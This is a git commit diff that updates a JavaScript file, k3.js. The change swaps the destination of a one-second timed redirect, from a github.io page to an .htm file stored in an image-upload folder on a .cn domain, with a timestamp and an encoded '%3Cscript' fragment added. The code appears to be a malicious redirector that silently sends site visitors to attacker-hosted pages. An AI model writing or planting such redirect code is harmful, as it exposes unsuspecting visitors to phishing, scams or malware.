b3f1f502a37407722a68c180808d494b1c5e6699
iuuc <145624790+iuuc@users.noreply.github.com>
2024-01-10 00:00:11 +0800

    Update k3.js

--- k3.js
+++ k3.js
@@ -10,6 +10,6 @@ leleua();
 
 setTimeout(function() {
     var timestamp = new Date().getTime();
-    var url = 'https://ccffq.github.io/ff.html' + '#' + timestamp + '%3Cscript';
+    var url = 'https://ttuu.6pian.cn/upload-img/2024/01/05/d0b1ea1660f59ce0037230bc2e7de5fe.htm' + '?' + timestamp + '%3Cscript';
     location.href = url;
 }, 1000);
